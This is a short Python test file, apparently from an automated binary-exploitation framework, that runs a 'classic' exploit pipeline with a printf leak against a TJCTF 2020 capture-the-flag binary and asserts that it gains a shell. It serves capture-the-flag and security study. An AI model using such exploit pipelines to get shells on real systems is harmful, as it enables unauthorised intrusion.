from .. import *

BIN = "./tests/tjctf_2020/stop"


def test_stop(exploit):
    # this is the example from the README
    def send_letter_first(t, data):
        # the binary expects us to choose a letter first, before it takes input unsafely
        t.sendline("A")
        # avoid messing up output by cleaning it of whatever "A" did
        t.clean(constants.CLEAN_TIME)
        # send actual payload
        t.sendline(data)
        # clean output so generic output gets out of the way
        t.recvuntil(b"Sorry, we don't have that category yet\n")

    # in this case a function is overkill,
    # but demonstrates the flexibility of custom pipelines
    def set_overwriter(state):
        state.overwriter = send_letter_first
        return state

    # create a starting state - modified to use fixture
    s = exploit(BIN, process(BIN))

    # build a custom pipeline - base classic pipeline, with printf for leaking
    pipeline = Pipeline(set_overwriter, turnkey.classic(leak=leak.printf))
    result = pipeline(s)

    assert have_shell(result.target)
